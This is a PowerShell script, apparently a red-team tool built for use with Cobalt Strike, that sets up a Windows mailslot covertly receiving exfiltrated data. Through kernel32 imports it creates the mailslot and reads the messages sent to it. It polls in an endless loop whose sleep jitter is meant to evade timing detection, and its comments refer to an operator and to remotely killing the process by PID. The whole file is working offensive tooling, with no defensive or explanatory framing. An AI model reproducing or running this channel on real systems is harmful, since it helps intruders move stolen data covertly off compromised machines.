## This version is being tested in Cobalt Strike 3.2 (4 Apr 2016)
## Author: Gary Butler
## Date: 23 June 2017 1833 GMT
## This version is fully functional. It retrieves all messages
## from the mailslot and polls based on a mandatory sleep
## argument. It also implements Jitter which is a percentage of
## the specified sleep time. The script now includes the ability
## to name the Mailslot; however, this is not required as it is
## set to MailSlotAlpha as the default. Debug statements have 
## been removed or modified and finally good comments have been
## added.

# This section imports libraries from the kernel. The Add-Type
# way of doing this does create files on disk. :(
Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
 
	public static class kernel32
	{
    	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    	public static extern uint CreateMailslot(string mailslotName,
                            uint nMaxMessageSize, int lReadTimeout,
                            IntPtr securityAttributes);


   		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    	[return: MarshalAs(UnmanagedType.Bool)]
    	public static extern bool GetMailslotInfo(uint hMailslot,
                            IntPtr lpMaxMessageSize, 
                            out int lpNextSize, out int lpMessageCount,
                            IntPtr lpReadTimeout);
		

    	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    	[return: MarshalAs(UnmanagedType.Bool)]
    	public static extern bool ReadFile(uint handle,
                            byte[] bytes, int numBytesToRead, out int numBytesRead,
                            IntPtr overlapped);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool CloseHandle(
							IntPtr hObject);
	}
"@

# This function will create the MailSlot
function New-MailSlot
{
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $True, Position = 1)]
			[string]$MailSlotName
		)
	

	$mh = [kernel32]::CreateMailslot("\\.\mailslot\$MailSlotName", 0, 0, 0)
	Write-Host "MailSlot Handle is: $mh."
	Write-Output $mh
}

# This function will be left here if ever there should be 
# the need for an operator to simply check the Mailslot info.
#function Get-MailSlotInfo
#{
#	[CmdletBinding()]
#	Param (
#		[Parameter(Mandatory = $True, Position = 1)]
#		[int]$MailSlotHandle
#	)
#	
#	Write-Host $MailSlotHandle
#
#	$messageBytes = $bytesRead = $messages = 0
#	$si = [kernel32]::GetMailslotInfo($MailSlotHandle, 0, [ref]$messageBytes, [ref]$messages, 0)
#	Write-Host $si`t$messages`t$messageBytes`t$bytesRead
#}

# This function does the heavy lifting. It retrieves the messages.
function Get-MailSlotMessages
{
	[CmdletBinding()]
	Param (
		[Parameter(Mandatory = $True, Position = 1)]
		[int]$MailSlotHandle
	)
	
	$messageBytes = $bytesRead = $messages = 0
	
	Write-Output "Getting MailslotInfo..."
	try
	{
		[kernel32]::GetMailslotInfo($MailSlotHandle, 0, [ref]$messageBytes, [ref]$messages, 0) | Out-Null
	}
	
	catch
	{
		Write-Output "GetMailslotInfo: $PSItem.Exception"
		Write-Output "MSI: Closing Handle."
		[kernel32]::CloseHandle($MailSlotHandle)
	}
	
#	Write-Output "Checking MessageBytes: $messageBytes."
	if ($messageBytes -eq -1)
	{
		return $null
	}
		
	Write-Output "Reading MailSlot Files..."
	while ($messages -gt 0)
	{
#		Write-Output "Creating Buffer..."
		$buffer = New-Object byte[] $messageBytes
		
		try
		{
			(([kernel32]::ReadFile($MailSlotHandle, $buffer, $messageBytes, [ref]$bytesRead, 0) -eq $false) -or ($bytesRead -eq 0)) | Out-Null
		}
		
		catch
		{
			Write-Output "ReadFile: $PSItem.Exception"
			Write-Output "RF: Closing Handle."
			[kernel32]::CloseHandle($MailSlotHandle)
		}
		
#		Write-Output "Writing buffer to console..."
		Write-Output "[$messages]`t$([System.Text.Encoding]::ASCII.GetString($buffer))"
#		Write-Output "#######################################################"
#		Write-Output "## Messages: $messages`tMessage Bytes: $messageBytes`tBytes Read: $bytesRead. ##"
#		Write-Output "#######################################################"
		
#		Write-Output "Getting MailslotInfo..."
		try
		{
			[kernel32]::GetMailslotInfo($MailSlotHandle, 0, [ref]$messageBytes, [ref]$messages, 0) | Out-Null
		}
		
		catch
		{
			Write-Output "GetMailslotInfo: $PSItem.Exception"
			Write-Output "MSI: Closing Handle."
			[kernel32]::CloseHandle($MailSlotHandle)
		}
		
#		Write-Output "Checking MessageBytes: $messageBytes."
		if ($messageBytes -eq -1)
		{
			break
		}
	}
}

# This is the "Main()" function.
function Start-MailSlotExfil
{
	[CmdletBinding()]
	Param (
		[Parameter(Mandatory = $false, Position = 1)]
		[string]$MailSlotName="MailSlotAlpha",
		[Parameter(Mandatory = $True, Position = 2)]
		[int]$SleepSeconds,
		[Parameter(Mandatory = $false, Position = 3)]
		[ValidateRange(1,100)]
		[int]$Jitter
	)
	
	# If Jitter is set and validated...
	if ([bool]$Jitter)
	{
		Write-Output "Jitter is enabled at $Jitter%."
	}
	
	# Create the Mailslot and give me the handle integer
	$mh = (New-MailSlot -MailSlotName $MailSlotName)
	
	# Since the loop below executes forever, the PID is included in the sleep
	# output so that we know what to kill remotely
	while ($true)
	{
		$messageBytes = $bytesRead = $messages = 0
#		Write-output "In loop, after initialization"
		if ([kernel32]::GetMailslotInfo($mh, 0, [ref]$messageBytes, [ref]$messages, 0) -eq $true -and $messageBytes -ne -1)
		{
#			write-output "We've got mail! Going in to fetch it."
			Get-MailSlotMessages -MailSlotHandle $mh
		}
		
		else
		{
			if ([bool]$Jitter)
			{
				$NewSleepSeconds = [System.Math]::Ceiling(($SleepSeconds - (Get-Random)%($SleepSeconds * ($Jitter/100))))
			}
			
			else
			{
				$NewSleepSeconds = $SleepSeconds	
			}
			
			# Only tell me if you're going to sleep for a decent amount of time.
			if ($NewSleepSeconds -gt 15)
			{
				Write-Output "[$PID] Going to sleep for $NewSleepSeconds seconds. $((Get-Date).ToLongTimeString())"
			}
			
			Start-Sleep -Seconds $NewSleepSeconds
		}
	}
}